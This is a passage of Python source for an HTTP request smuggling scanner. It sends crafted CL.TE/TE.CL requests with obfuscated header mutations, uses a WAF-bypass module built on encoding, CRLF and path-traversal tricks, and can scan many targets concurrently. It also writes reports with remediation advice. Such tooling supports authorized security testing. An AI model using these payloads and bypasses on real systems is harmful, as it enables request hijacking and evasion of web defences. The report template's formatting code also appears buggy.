        """Generate all obfuscated versions of a payload"""
        obfuscated = [base_payload]
        
        for technique in self.obfuscation_techniques:
            try:
                variations = technique(base_payload)
                obfuscated.extend(variations)
            except:
                continue
        
        # Remove duplicates while preserving order
        seen = set()
        unique = []
        for item in obfuscated:
            if item not in seen:
                seen.add(item)
                unique.append(item)
        
        return unique[:50]  # Limit to prevent overwhelming


class ConcurrentScanner:
    def __init__(self, max_workers=5):
        self.max_workers = max_workers
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
        self.results_queue = queue.Queue()
        self.lock = threading.Lock()
        self.progress_lock = threading.Lock()
        self.completed = 0
        self.total = 0
        
    def scan_target(self, target_url, method, timeout, retry, payloads, proxy=None, cookies=None, auth=None):
        """Scan a single target with multiple payloads"""
        constants = Constants()
        utils = Utils()
        results = {
            'url': target_url,
            'vulnerable': False,
            'findings': [],
            'timing_analysis': {},
            'response_analysis': {},
            'threats': {},
            'payloads_tested': 0,
            'timestamp': datetime.now().isoformat(),
            'session_id': utils.generate_session_id(),
            'method': method,
            'timeout': timeout,
            'retry': retry,
            'proxy': proxy,
            'errors': [],
        }
        
        try:
            result = utils.url_parser(target_url)
            json_res = json.loads(result)
            host = json_res['host']
            port = json_res['port']
            path = json_res['path']
            
            if host is None:
                results['error'] = "Invalid host"
                return results
            
            # Initialize components
            timing_analyzer = TimingAnalyzer()
            response_analyzer = ResponseAnalyzer()
            threat_detector = ThreatDetector()
            payload_obfuscator = PayloadObfuscator()
            ml_detector = MLDetector()
            
            # Establish baseline
            threshold = timing_analyzer.establish_baseline(host, port, path, method, timeout)
            results['timing_analysis']['baseline_threshold'] = threshold
            results['timing_analysis']['mean'] = timing_analyzer.mean
            results['timing_analysis']['stdev'] = timing_analyzer.stdev
            
            # Test each payload
            total_payloads = len(payloads) * retry
            tested = 0
            
            for payload_info in payloads:
                try:
                    payload_data = payload_info.get('payload', '')
                    content_length = payload_info.get('content_length', 0)
                    
                    # Generate obfuscated versions
                    obfuscated_payloads = payload_obfuscator.generate_obfuscated_payloads(payload_data)
                    
                    for obfuscated_payload in obfuscated_payloads[:15]:  # Limit to avoid overwhelming
                        for attempt in range(retry):
                            try:
                                start_time = time.time()
                                connection = SocketConnection(proxy=proxy)
                                connection.connect(host, port, timeout)
                                
                                # Build headers with optional cookies and auth
                                headers = f'{method} {path} HTTP/1.1{constants.crlf}'
                                headers += f'Host: {host}{constants.crlf}'
                                
                                if cookies:
                                    headers += f'Cookie: {cookies}{constants.crlf}'
                                
                                if auth:
                                    headers += f'Authorization: Basic {base64.b64encode(auth.encode()).decode()}{constants.crlf}'
                                
                                headers += f'Content-Length: {content_length}{constants.crlf}'
                                headers += f'Transfer-Encoding: chunked{constants.crlf}{constants.crlf}'
                                smuggle_body = headers + obfuscated_payload
                                
                                connection.send_payload(smuggle_body)
                                response = connection.receive_data()
                                end_time = time.time()
                                connection.close_connection()
                                
                                response_time = end_time - start_time
                                tested += 1
                                results['payloads_tested'] += 1
                                
                                # Analyze response
                                if response:
                                    indicators = response_analyzer.analyze_response(response)
                                    if indicators:
                                        results['findings'].append({
                                            'payload': obfuscated_payload[:200],
                                            'response_time': response_time,
                                            'indicators': indicators,
                                            'attempt': attempt + 1
                                        })
                                
                                # Check for smuggling using multiple methods
                                is_vulnerable = SocketConnection.detect_hrs_vulnerability(start_time, timeout)
                                is_anomaly = timing_analyzer.detect_anomaly(response_time, threshold)
                                
                                # ML detection
                                features = ml_detector.extract_features(smuggle_body, response)
                                ml_result = ml_detector.predict(features)
                                
                                if is_vulnerable or is_anomaly or ml_result.get('vulnerable', False):
                                    results['vulnerable'] = True
                                    results['findings'].append({
                                        'payload': obfuscated_payload[:200],
                                        'response_time': response_time,
                                        'anomaly_detected': True,
                                        'vulnerability': True,
                                        'ml_confidence': ml_result.get('confidence', 0),
                                    })
                                
                                timing_analyzer.add_to_history(response_time)
                                
                            except Exception as e:
                                results['errors'].append(str(e))
                                continue
                            
                            time.sleep(0.3 + random.random() * 0.2)
                            
                except Exception as e:
                    results['errors'].append(f"Payload processing error: {str(e)}")
                    continue
            
            # Run comprehensive threat scan
            threat_results = threat_detector.run_comprehensive_scan(host, port, path, method, timeout)
            results['threats'] = threat_results
            
            # Check if any threat was detected
            for threat_type, result in threat_results.items():
                if result is True:
                    results['vulnerable'] = True
                    results['findings'].append({'threat': threat_type, 'detected': True})
            
            # Additional checks
            if not results['vulnerable'] and len(results['findings']) > 3:
                # If multiple indicators found, mark as suspicious
                results['vulnerable'] = True
                
            # Update progress
            with self.progress_lock:
                self.completed += 1
                
        except Exception as e:
            results['error'] = str(e)
            results['errors'].append(str(e))
        
        return results
    
    def scan_bulk(self, targets, method, timeout, retry, payloads, proxy=None, cookies=None, auth=None):
        """Scan multiple targets concurrently"""
        results = {}
        futures = []
        self.total = len(targets)
        self.completed = 0
        
        print(colored(f"\n[+] Starting concurrent scan of {len(targets)} targets with {self.max_workers} workers...", 'cyan', attrs=['bold']))
        
        for target in targets:
            future = self.executor.submit(
                self.scan_target, 
                target, 
                method, 
                timeout, 
                retry, 
                payloads,
                proxy,
                cookies,
                auth
            )
            futures.append((target, future))
        
        with ThreadPoolExecutor(max_workers=1) as progress_executor:
            progress_future = progress_executor.submit(self._update_progress)
        
        for target, future in futures:
            try:
                result = future.result(timeout=timeout * 3)
                results[target] = result
            except Exception as e:
                results[target] = {'error': str(e), 'vulnerable': False}
        
        return results
    
    def _update_progress(self):
        """Update progress in real-time"""
        while self.completed < self.total:
            progress = (self.completed / self.total) * 100 if self.total > 0 else 0
            bar = '█' * int(progress / 2) + '░' * (50 - int(progress / 2))
            sys.stdout.write(f'\r[{bar}] {self.completed}/{self.total} ({progress:.1f}%)')
            sys.stdout.flush()
            time.sleep(0.5)
        print()


class WAFBypass:
    def __init__(self):
        self.bypass_techniques = [
            self.path_manipulation,
            self.parameter_pollution,
            self.encoding_bypass,
            self.header_splitting,
            self.case_manipulation,
            self.word_manipulation,
        ]
    
    def path_manipulation(self, path):
        """Bypass WAF path restrictions"""
        bypasses = [
            path,
            path + "/.",
            path + "/../",
            path + "?param=value",
            path + "#fragment",
            path + "%00",
            path + "%0d%0a",
            path + "/%2e%2e/",
            path + "%2f%2e%2e%2f",
            path + "//",
            path + "/./",
            path + "/%2e/",
            path + "/%2E/",
            path.replace('/', '/%252f'),
        ]
        return list(set(bypasses))
    
    def parameter_pollution(self, payload):
        """Bypass using parameter pollution"""
        variants = []
        params = re.findall(r'(\w+)=([^&\s]+)', payload)
        if params:
            for key, value in params:
                variants.append(payload.replace(f'{key}={value}', f'{key}={value}&{key}={value}'))
                variants.append(payload.replace(f'{key}={value}', f'{key}[]={value}'))
                variants.append(payload.replace(f'{key}={value}', f'{key}={value}%00'))
                variants.append(payload.replace(f'{key}={value}', f'{key}={value}%2e%2e%2f'))
        return variants
    
    def encoding_bypass(self, payload):
        """Bypass using different encodings"""
        variants = []
        # URL encoding
        variants.append(payload.replace('%', '%25'))
        variants.append(payload.replace(' ', '%20'))
        variants.append(payload.replace(':', '%3A'))
        variants.append(payload.replace('\r', '%0D'))
        variants.append(payload.replace('\n', '%0A'))
        variants.append(payload.replace('/', '%2F'))
        variants.append(payload.replace('?', '%3F'))
        variants.append(payload.replace('=', '%3D'))
        variants.append(payload.replace('&', '%26'))
        
        # Double encoding
        variants.append(payload.replace('%20', '%2520'))
        variants.append(payload.replace('%3A', '%253A'))
        variants.append(payload.replace('%2F', '%252F'))
        
        # Unicode encoding
        variants.append(payload.replace(' ', '\u0020'))
        variants.append(payload.replace(':', '\u003A'))
        variants.append(payload.replace('/', '\u002F'))
        
        return variants
    
    def header_splitting(self, headers):
        """Bypass by splitting headers"""
        variants = []
        headers_str = headers
        # Split across lines
        variants.append(headers_str.replace('\r\n', '\r\n '))
        variants.append(headers_str.replace('\r\n', '\r\n\t'))
        variants.append(headers_str.replace(':', ':\r\n '))
        variants.append(headers_str.replace(':', ':\r\n\t'))
        return variants
    
    def case_manipulation(self, payload):
        """Manipulate case for bypass"""
        variants = []
        # Random case
        for _ in range(5):
            randomized = ''.join(
                c.upper() if random.random() > 0.5 else c.lower() 
                for c in payload
            )
            variants.append(randomized)
        
        # Specific header case variations
        header_patterns = ['get', 'post', 'content-length', 'transfer-encoding', 'host', 'connection']
        for pattern in header_patterns:
            if pattern in payload.lower():
                variations = [
                    pattern.upper(),
                    pattern.capitalize(),
                    pattern.title(),
                    ''.join(c.upper() if i%2 else c.lower() for i, c in enumerate(pattern))
                ]
                for var in variations:
                    variants.append(payload.replace(pattern, var, 1))
        
        return variants
    
    def word_manipulation(self, payload):
        """Manipulate words for bypass"""
        variants = []
        word_replacements = {
            'chunked': ['chunked', 'chunk', 'x-chunked', 'chunked\x00', 'chunked\x0b'],
            'identity': ['identity', 'id', 'identify'],
            'close': ['close', 'closed', 'cl0se'],
            'keep-alive': ['keep-alive', 'keepalive', 'keep_alive'],
        }
        
        for word, replacements in word_replacements.items():
            if word in payload.lower():
                for replacement in replacements:
                    variants.append(payload.replace(word, replacement, 1))
        
        return variants


class ReportGenerator:
    def __init__(self):
        self.report_format = 'html'
        self.output_dir = 'reports'
        
    def generate_report(self, results, output_dir='reports'):
        """Generate comprehensive report in multiple formats"""
        self.output_dir = output_dir
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Calculate summary
        total_targets = len(results)
        vulnerable_targets = sum(1 for r in results.values() if r.get('vulnerable', False))
        safe_targets = total_targets - vulnerable_targets
        
        # Collect all findings
        all_findings = []
        for url, result in results.items():
            if result.get('findings'):
                all_findings.extend(result['findings'])
        
        report = {
            'timestamp': datetime.now().isoformat(),
            'summary': {
                'total_targets': total_targets,
                'vulnerable_targets': vulnerable_targets,
                'safe_targets': safe_targets,
                'detection_rate': (vulnerable_targets / total_targets * 100) if total_targets > 0 else 0,
                'total_findings': len(all_findings),
                'avg_payloads_tested': sum(r.get('payloads_tested', 0) for r in results.values()) / max(total_targets, 1),
            },
            'detailed_results': results,
            'recommendations': self.generate_recommendations(results),
            'statistics': self.generate_statistics(results),
        }
        
        # Generate reports in multiple formats
        report_files = {}
        
        # HTML report
        html_file = os.path.join(output_dir, f'smuggling_report_{timestamp}.html')
        self.generate_html_report(report, html_file)
        report_files['html'] = html_file
        
        # JSON report
        json_file = os.path.join(output_dir, f'smuggling_report_{timestamp}.json')
        with open(json_file, 'w') as f:
            json.dump(report, f, indent=2)
        report_files['json'] = json_file
        
        # CSV report
        csv_file = os.path.join(output_dir, f'smuggling_report_{timestamp}.csv')
        self.generate_csv_report(report, csv_file)
        report_files['csv'] = csv_file
        
        # Markdown report
        md_file = os.path.join(output_dir, f'smuggling_report_{timestamp}.md')
        self.generate_markdown_report(report, md_file)
        report_files['markdown'] = md_file
        
        return report_files
    
    def generate_html_report(self, report, filename):
        """Generate HTML formatted report with modern design"""
        html_template = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>HTTP Request Smuggling Detection Report</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Oxygen, Ubuntu, sans-serif;
                    background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
                    min-height: 100vh;
                    padding: 20px;
                }
                .container { 
                    max-width: 1400px; 
                    margin: 0 auto; 
                    background: rgba(255,255,255,0.95);
                    padding: 30px; 
                    border-radius: 15px; 
                    box-shadow: 0 10px 40px rgba(0,0,0,0.15);
                    backdrop-filter: blur(10px);
                }
                .header { 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
                    color: white; 
                    padding: 30px; 
                    border-radius: 12px; 
                    margin-bottom: 30px;
                    text-align: center;
                }
                .header h1 { font-size: 2.5em; margin-bottom: 10px; font-weight: 300; }
                .header .subtitle { opacity: 0.9; font-size: 1.1em; }
                .summary-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin: 30px 0;
                }
                .summary-card {
                    background: #f8f9fa;
                    padding: 20px;
                    border-radius: 10px;
                    text-align: center;
                    border-left: 4px solid #667eea;
                    transition: transform 0.2s;
                }
                .summary-card:hover { transform: translateY(-5px); }
                .summary-card .number { 
                    font-size: 2.5em; 
                    font-weight: bold; 
                    color: #667eea;
                }
                .summary-card .label { 
                    color: #6c757d; 
                    font-size: 0.9em; 
                    margin-top: 5px; 
                }
                .vulnerable .number { color: #dc3545; }
                .safe .number { color: #28a745; }
                .info .number { color: #17a2b8; }
                
                table { 
                    border-collapse: collapse; 
                    width: 100%; 
                    margin: 20px 0;
                    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
                    border-radius: 8px;
                    overflow: hidden;
                }
                th { 
                    background: #667eea; 
                    color: white; 
                    padding: 15px; 
                    text-align: left; 
                    font-weight: 600;
                }
                td { 
                    padding: 12px 15px; 
                    border-bottom: 1px solid #e9ecef; 
                }
                tr:nth-child(even) { background-color: #f8f9fa; }
                tr:hover { background-color: #e9ecef; }
                
                .badge {
                    display: inline-block;
                    padding: 4px 12px;
                    border-radius: 20px;
                    font-size: 0.85em;
                    font-weight: 600;
                }
                .badge-vulnerable { background: #dc3545; color: white; }
                .badge-safe { background: #28a745; color: white; }
                .badge-warning { background: #ffc107; color: #333; }
                
                .findings-list {
                    background: #fff3cd;
                    padding: 10px 15px;
                    border-radius: 6px;
                    margin: 5px 0;
                    border-left: 3px solid #ffc107;
                }
                .threat-tag {
                    display: inline-block;
                    background: #f8d7da;
                    padding: 3px 10px;
                    border-radius: 15px;
                    margin: 2px;
                    font-size: 0.85em;
                    color: #721c24;
                }
                .recommendations {
                    background: #d1ecf1;
                    padding: 25px;
                    border-radius: 10px;
                    margin: 30px 0;
                    border-left: 5px solid #0c5460;
                }
                .recommendations ul { margin-left: 20px; }
                .recommendations li { margin: 8px 0; }
                
                .error-log {
                    background: #f8d7da;
                    padding: 15px;
                    border-radius: 6px;
                    margin: 10px 0;
                    color: #721c24;
                    font-family: monospace;
                    font-size: 0.9em;
                }
                
                @media (max-width: 768px) {
                    .container { padding: 15px; }
                    .header h1 { font-size: 1.8em; }
                    .summary-grid { grid-template-columns: 1fr 1fr; }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>HTTP Request Smuggling Detection Report</h1>
                    <div class="subtitle">Generated: {timestamp}</div>
                </div>
                
                <div class="summary-grid">
                    <div class="summary-card">
                        <div class="number">{total_targets}</div>
                        <div class="label">Total Targets</div>
                    </div>
                    <div class="summary-card vulnerable">
                        <div class="number">{vulnerable_targets}</div>
                        <div class="label">Vulnerable</div>
                    </div>
                    <div class="summary-card safe">
                        <div class="number">{safe_targets}</div>
                        <div class="label">Safe</div>
                    </div>
                    <div class="summary-card info">
                        <div class="number">{detection_rate:.1f}%</div>
                        <div class="label">Detection Rate</div>
                    </div>
                    <div class="summary-card info">
                        <div class="number">{total_findings}</div>
                        <div class="label">Total Findings</div>
                    </div>
                    <div class="summary-card info">
                        <div class="number">{avg_payloads:.0f}</div>
                        <div class="label">Avg Payloads Tested</div>
                    </div>
                </div>
                
                <h2 style="margin-top: 30px;">Detailed Results</h2>
                <table>
                    <tr>
                        <th>Target URL</th>
                        <th>Status</th>
                        <th>Threats</th>
                        <th>Findings</th>
                        <th>Payloads</th>
                        <th>Session</th>
                    </tr>
                    {rows}
                </table>
                
                <div class="recommendations">
                    <h2>Recommendations</h2>
                    <ul>
                        {recommendations}
                    </ul>
                </div>
                
                <div style="margin-top: 30px; text-align: center; color: #6c757d; font-size: 0.9em;">
                    Report generated by HRS Detector v3.0
                </div>
            </div>
        </body>
        </html>
        """
        
        rows = ""
        for url, result in report['detailed_results'].items():
            vulnerable = result.get('vulnerable', False)
            status_text = '<span class="badge badge-vulnerable">VULNERABLE</span>' if vulnerable else '<span class="badge badge-safe">SAFE</span>'
            
            threats = ""
            if result.get('threats'):
                for t, v in result['threats'].items():
                    if v is True:
                        threats += f'<span class="threat-tag">{t}</span> '
            
            findings = ""
            if result.get('findings'):
                for f in result['findings'][:3]:
                    if isinstance(f, dict):
                        desc = f.get('indicators', [''])[0] if f.get('indicators') else f.get('payload', '')[:100]
                        findings += f"<div class='findings-list'>{desc}</div>"
                    else:
                        findings += f"<div class='findings-list'>{str(f)[:100]}</div>"
            
            if result.get('errors'):
                findings += f"<div class='error-log'>Errors: {result['errors'][0][:100]}</div>"
            
            payloads_tested = result.get('payloads_tested', 0)
            session_id = result.get('session_id', 'N/A')
            
            rows += f"""
                <tr>
                    <td><strong>{url}</strong></td>
                    <td>{status_text}</td>
                    <td>{threats}</td>
                    <td>{findings}</td>
                    <td>{payloads_tested}</td>
                    <td><code>{session_id}</code></td>
                </tr>
            """
        
        recommendations_html = ""
        for rec in report['recommendations'][:10]:
            recommendations_html += f"<li>{rec}</li>"
        
        with open(filename, 'w') as f:
            f.write(html_template.format(
                timestamp=report['timestamp'],
                total_targets=report['summary']['total_targets'],
                vulnerable_targets=report['summary']['vulnerable_targets'],
                safe_targets=report['summary']['safe_targets'],
                detection_rate=report['summary']['detection_rate'],
                total_findings=report['summary']['total_findings'],
                avg_payloads=report['summary']['avg_payloads_tested'],
                rows=rows,
                recommendations=recommendations_html
            ))
    
    def generate_csv_report(self, report, filename):
        """Generate CSV report"""
        with open(filename, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([
                'Target URL', 'Vulnerable', 'Threats', 'Findings Count', 
                'Payloads Tested', 'Session ID', 'Timestamp', 'Errors'
            ])
            
            for url, result in report['detailed_results'].items():
                vulnerable = 'Yes' if result.get('vulnerable') else 'No'
                threats = [t for t, v in result.get('threats', {}).items() if v is True]
                threats_str = ', '.join(threats) if threats else 'None'
                findings_count = len(result.get('findings', []))
                payloads_tested = result.get('payloads_tested', 0)
                session_id = result.get('session_id', 'N/A')
                timestamp = result.get('timestamp', '')
                errors = ', '.join(result.get('errors', []))[:200]
                
                writer.writerow([
                    url, vulnerable, threats_str, findings_count,
                    payloads_tested, session_id, timestamp, errors
                ])
    
    def generate_markdown_report(self, report, filename):
        """Generate Markdown report"""
        with open(filename, 'w') as f:
            f.write(f"# HTTP Request Smuggling Detection Report\n\n")
            f.write(f"**Generated:** {report['timestamp']}\n\n")
            
            f.write("## Summary\n\n")
            f.write("| Metric | Value |\n")
            f.write("|--------|-------|\n")
            f.write(f"| Total Targets | {report['summary']['total_targets']} |\n")
            f.write(f"| Vulnerable | {report['summary']['vulnerable_targets']} |\n")
            f.write(f"| Safe | {report['summary']['safe_targets']} |\n")
            f.write(f"| Detection Rate | {report['summary']['detection_rate']:.1f}% |\n")
            f.write(f"| Total Findings | {report['summary']['total_findings']} |\n\n")
            
            f.write("## Detailed Results\n\n")
            f.write("| Target | Status | Threats | Findings | Payloads |\n")
            f.write("|--------|--------|---------|----------|----------|\n")
            
            for url, result in report['detailed_results'].items():
                status = "VULNERABLE" if result.get('vulnerable') else "SAFE"
                threats = [t for t, v in result.get('threats', {}).items() if v is True]
                threats_str = ', '.join(threats) if threats else 'None'
                findings_count = len(result.get('findings', []))
                payloads = result.get('payloads_tested', 0)
                f.write(f"| {url} | {status} | {threats_str} | {findings_count} | {payloads} |\n")
            
            f.write("\n## Recommendations\n\n")
            for rec in report['recommendations'][:10]:
                f.write(f"- {rec}\n")
    
    def generate_recommendations(self, results):
        """Generate recommendations based on findings"""
        recommendations = set()
        
        for url, result in results.items():
            if result.get('vulnerable', False):
                recommendations.add(f"**{url}**: Implement proper request validation and normalization")
                recommendations.add(f"**{url}**: Apply web application firewall (WAF) rules specific to HTTP request smuggling")
                
                # Specific recommendations based on threats
                threats = result.get('threats', {})
                for threat_type, vulnerable in threats.items():
                    if vulnerable is True:
                        if 'CL.TE' in threat_type:
                            recommendations.add(f"**{url}**: Fix CL.TE vulnerability - Ensure consistent Content-Length and Transfer-Encoding handling")
                        elif 'TE.CL' in threat_type:
                            recommendations.add(f"**{url}**: Fix TE.CL vulnerability - Implement proper parsing order for Transfer-Encoding")
                        elif 'TE.TE' in threat_type:
                            recommendations.add(f"**{url}**: Fix TE.TE vulnerability - Normalize and validate Transfer-Encoding headers")
                        elif 'CL.CL' in threat_type:
                            recommendations.add(f"**{url}**: Fix CL.CL vulnerability - Reject requests with duplicate Content-Length headers")
                
                # Recommendations based on findings
                if result.get('findings'):
                    findings = result['findings']
                    for finding in findings:
                        if isinstance(finding, dict):
                            indicators = finding.get('indicators', [])
                            if 'content_length_mismatch' in indicators:
                                recommendations.add(f"**{url}**: Address Content-Length mismatch issues")
                            if 'chunked_response' in indicators:
                                recommendations.add(f"**{url}**: Review chunked encoding handling")
        
        if not recommendations:
            recommendations.add("No immediate action required. Continue monitoring for new smuggling techniques.")
            recommendations.add("Consider implementing regular security scans for HTTP request smuggling.")
        
        # Add general recommendations
        recommendations.add("Implement HTTP/2 protocol to reduce smuggling risk")
        recommendations.add("Use modern web application firewalls with smuggling detection capabilities")
        recommendations.add("Regularly update and patch web servers and reverse proxies")
        recommendations.add("Implement request normalization at the edge")
        recommendations.add("Monitor for unusual request patterns and timing anomalies")
        
        return list(recommendations)
    
    def generate_statistics(self, results):
        """Generate additional statistics"""
        stats = {
            'threat_distribution': defaultdict(int),
            'error_counts': 0,
            'total_findings': 0,
            'avg_response_time': 0,
        }
        
        for result in results.values():
            if result.get('threats'):
                for threat, vulnerable in result['threats'].items():
                    if vulnerable is True:
                        stats['threat_distribution'][threat] += 1
            
            if result.get('errors'):
                stats['error_counts'] += len(result['errors'])
            
            stats['total_findings'] += len(result.get('findings', []))
        
        return stats


class EnhancedHRSDetector:
    def __init__(self):
        self.payload_generator = AdvancedPayloads()
        self.timing_analyzer = TimingAnalyzer()
        self.response_analyzer = ResponseAnalyzer()
        self.threat_detector = ThreatDetector()
        self.obfuscator = PayloadObfuscator()
        self.report_generator = ReportGenerator()
        self.concurrent_scanner = ConcurrentScanner()
        self.waf_bypass = WAFBypass()
        self.http2_handler = HTTP2Handler()
        self.websocket_handler = WebSocketHandler()
        self.ml_detector = MLDetector()
        self.constants = Constants()
        self.utils = Utils()
    
    def run_enhanced_scan(self, url, method, timeout, retry, proxy=None, cookies=None, auth=None):
        """Run comprehensive smuggling detection on a single target"""
        print(colored(f"\n[+] Enhanced Scan: {url}", 'cyan', attrs=['bold']))
        
        result = self.utils.url_parser(url)
        try:
            json_res = json.loads(result)
            host = json_res['host']
            port = json_res['port']
            path = json_res['path']
            
            if host is None:
                print(colored("Invalid host", 'red'))
                return None
            
            print(colored(f"[+] Target: {host}:{port}{path}", 'yellow'))
            print(colored(f"[+] Method: {method}, Timeout: {timeout}s, Retry: {retry}", 'yellow'))
            if proxy:
                print(colored(f"[+] Proxy: {proxy}", 'yellow'))
            if cookies:
                print(colored(f"[+] Cookies: {cookies[:50]}...", 'yellow'))
            
            # Check HTTP/2 support
            print(colored("[+] Checking HTTP/2 support...", 'cyan'))
            if self.http2_handler.is_supported():
                http2_result = self.http2_handler.detect_http2_smuggling(host, port, path, method, timeout)
                if http2_result.get('vulnerable'):
                    print(colored("[!] HTTP/2 smuggling vulnerability detected!", 'red'))
            else:
                print(colored("[!] HTTP/2 not supported - install h2 library for full coverage", 'yellow'))
            
            # Check WebSocket
            print(colored("[+] Checking WebSocket smuggling...", 'cyan'))
            ws_result = self.websocket_handler.detect_websocket_smuggling(host, port, path, timeout)
            if ws_result.get('vulnerable'):
                print(colored("[!] WebSocket smuggling vulnerability detected!", 'red'))
            
            # Establish baseline
            print(colored("[+] Establishing timing baseline...", 'cyan'))
            threshold = self.timing_analyzer.establish_baseline(host, port, path, method, timeout)
            print(colored(f"[+] Baseline threshold: {threshold:.3f}s", 'green'))
            
            # Get payloads
            payloads = self.payload_generator.cl_te_payloads + self.payload_generator.te_cl_payloads
            print(colored(f"[+] Testing {len(payloads)} payload families...", 'cyan'))
            
            # Run scan
            print(colored("[+] Starting detection scan...", 'cyan'))
            results = self.concurrent_scanner.scan_target(
                url, method, timeout, retry, payloads, 
                proxy=proxy, cookies=cookies, auth=auth
            )
            
            # Display findings
            if results.get('vulnerable'):
                print(colored("\n[!] VULNERABILITY DETECTED!", 'red', attrs=['bold']))
                if results.get('threats'):
                    threats = [t for t, v in results['threats'].items() if v is True]
                    print(colored(f"[+] Detected threats: {', '.join(threats)}", 'red'))
                print(colored(f"[+] Findings count: {len(results.get('findings', []))}", 'red'))
            else:
                print(colored("\n[+] No vulnerabilities detected", 'green'))
            
            # Generate report
            print(colored("[+] Generating report...", 'cyan'))
            report_files = self.report_generator.generate_report({url: results})
            
            print(colored(f"\n[+] Scan complete!", 'green', attrs=['bold']))
            print(colored(f"[+] Reports saved to:", 'cyan'))
            for format_name, file_path in report_files.items():
                print(colored(f"    - {format_name}: {file_path}", 'yellow'))
            
            return results
            
        except ValueError as e:
            print(colored(f"Error parsing URL: {e}", 'red'))
            return None


PAYLOADS_JSON = """
{
	"permute": [
		{
			"type": "spacejoin",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer Encoding:",
				"te_value": "chunked"
			}
		},
		{
			"type": "default",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding:",
				"te_value": "chunked"
			}
		},
		{
			"type": "underjoin",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer_Encoding:",
				"te_value": "chunked"
			}
		},
		{
			"type": "space1",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding: ",
				"te_value": "chunked"
			}
		},
		{
			"type": "space2",
			"content_length_key": "Content-Length: ",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding:",
				"te_value": "chunked"
			}
		},
		{
			"type": "space3",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding[space here]:",
				"te_value": "chunked"
			}
		},
		{
			"type": "nameprefix1",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": " Transfer-Encoding:",
				"te_value": "chunked"
			}
		},
		{
			"type": "valueprefix1",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding:  ",
				"te_value": "chunked"
			}
		},
		{
			"type": "nospace1",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding:",
				"te_value": "chunked"
			}
		},
		{
			"type": "tabprefix1",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding:\t",
				"te_value": "chunked"
			}
		},
		{
			"type": "vertprefix1",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding:\u000B",
				"te_value": "chunked"
			}
		},
		{
			"type": "commaCow",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding: ",
				"te_value": "chunked, identity"
			}
		},
		{
			"type": "cowComma",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding: ",
				"te_value": "identity"
			}
		},
		{
			"type": "contentEnc",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Content-Encoding: ",
				"te_value": "chunked"
			}
		},
		{
			"type": "linewrapped1",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding:\n",
				"te_value": "chunked"
			}
		},
		{
			"type": "gareth1",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding\n : ",
				"te_value": "chunked"
			}
		},
		{
			"type": "quoted",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding: ",
				"te_value": "\"chunked\""
			}
		},
		{
			"type": "aposed",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding:",
				"te_value": "'chunked'"
			}
		},
		{
			"type": "badwrap",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Foo: bar\r\n Transfer-Encoding: ",
				"te_value": "chunked"
			}
		},
		{
			"type": "badsetupCR",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Fooz: bar\rTransfer-Encoding: ",
				"te_value": "chunked"
			}
		},
		{
			"type": "badsetupLF",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Fooz: bar\nTransfer-Encoding: ",
				"te_value": "chunked"
			}
		},
		{
			"type": "vertwrap",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding: \n\u000B",
				"te_value": "chunked"
			}
		},
		{
			"type": "tabwrap",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding: \n\t",
				"te_value": "chunked"
			}
		},
		{
			"type": "dualchunk",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding: ",
				"te_value": "chunked\r\nTransfer-Encoding: identity"
			}
		},
		{
			"type": "lazygrep",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding: ",
				"te_value": "chunk"
			}
		},
		{
			"type": "multiCase",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "TrAnSFer-EnCODinG: ",
				"te_value": "cHuNkeD"
			}
		},
		{
			"type": "UPPERCASE",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "TRANSFER-ENCODING: ",
				"te_value": "CHUNKED"
			}
		},
		{
			"type": "zdwrap",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Foo: bar\r\n\rTransfer-Encoding: ",
